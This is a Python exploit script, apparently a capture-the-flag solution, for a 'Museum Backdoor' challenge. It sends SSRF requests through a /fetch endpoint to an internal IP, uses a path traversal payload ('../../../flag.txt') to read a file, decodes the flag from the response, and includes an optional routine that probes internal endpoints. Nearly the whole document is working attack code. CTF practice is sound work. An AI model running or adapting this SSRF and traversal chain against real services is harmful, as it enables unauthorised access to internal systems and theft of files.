"""
Museum Backdoor Exploit
CTF Challenge - SSRF + Path Traversal

The backdoor is the /fetch endpoint that accepts arbitrary URLs.
Combined with path traversal in /public/images?filename= parameter.
"""

import requests

# Target URL
BASE_URL = "https://mnbvcxzasdfghj-csc26.cybersecuritychallenge.al"
FETCH_ENDPOINT = f"{BASE_URL}/fetch"

# Internal server IP (discovered from legitimate requests)
INTERNAL_IP = "172.16.0.30"

def exploit_ssrf(target_url):
    """
    Exploit the SSRF vulnerability via /fetch endpoint
    """
    headers = {
        "Content-Type": "text/plain"
    }
    
    response = requests.post(FETCH_ENDPOINT, data=target_url, headers=headers)
    return response

def get_flag():
    """
    Retrieve the flag using SSRF + Path Traversal
    """
    # Path traversal payload through the images endpoint
    payload = f"http://{INTERNAL_IP}/public/images?filename=../../../flag.txt"
    
    print(f"[*] Exploiting SSRF backdoor at: {FETCH_ENDPOINT}")
    print(f"[*] Target payload: {payload}")
    
    response = exploit_ssrf(payload)
    
    if response.status_code == 200:
        print(f"[+] Success! Status Code: {response.status_code}")
        
        # The response contains decimal ASCII values separated by newlines
        decimal_values = response.text.strip().split('\n')
        
        # Convert decimal values to characters
        flag = ''.join([chr(int(val)) for val in decimal_values])
        
        print(f"[+] Flag retrieved: {flag}")
        return flag
    else:
        print(f"[-] Failed with status code: {response.status_code}")
        print(f"[-] Response: {response.text}")
        return None

def explore_internal_server():
    """
    Optional: Explore the internal server to understand its structure
    """
    endpoints = [
        f"http://{INTERNAL_IP}/",
        f"http://{INTERNAL_IP}/about",
        f"http://{INTERNAL_IP}/contact",
        f"http://{INTERNAL_IP}/blogs",
    ]
    
    print("\n[*] Exploring internal server...")
    for endpoint in endpoints:
        print(f"\n[*] Testing: {endpoint}")
        response = exploit_ssrf(endpoint)
        if response.status_code == 200:
            print(f"[+] Found: {endpoint[:100]}...")
        else:
            print(f"[-] Not found: {response.status_code}")

if __name__ == "__main__":
    print("=" * 60)
    print("Museum Backdoor Exploit")
    print("=" * 60)
    
    # Get the flag
    flag = get_flag()
    
    if flag:
        print("\n" + "=" * 60)
        print(f"FLAG: {flag}")
        print("=" * 60)
    
    # Uncomment to explore the internal server structure
    # explore_internal_server()
